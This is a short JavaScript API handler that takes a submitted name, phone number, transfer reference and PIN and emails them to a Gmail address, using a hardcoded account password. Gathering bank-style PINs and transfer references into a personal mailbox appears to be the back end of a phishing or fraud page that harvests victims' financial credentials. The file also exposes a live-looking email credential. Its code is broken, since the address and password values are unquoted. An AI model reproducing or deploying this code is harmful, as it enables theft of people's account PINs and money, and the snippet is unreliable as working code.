require('dotenv').config();
const nodemailer = require('nodemailer');

export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { name, phone, reference, pin } = req.body;

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: legaljobagenciesuk@gmail.com,
                pass: Hhlbbcnofnsmaspscapc,
            },
        });

        const mailOptions = {
            from: legaljobagenciesuk@gmail.com,
            to: legaljobagenciesuk@gmail.com,
            subject: 'New User Data Submission',
            text: `Name: ${name}\nPhone: ${phone}\nTransfer Reference: ${reference}\nPIN: ${pin}`,
        };

        try {
            await transporter.sendMail(mailOptions);
            res.status(200).json({ message: 'Email sent successfully! for now' });
        } catch (error) {
            res.status(500).json({ error: 'Error sending email' });
        }
    } else {
        res.setHeader('Allow', ['POST']);
        res.status(405).end(`Method ${req.method} Not Allowed`);
    }
}
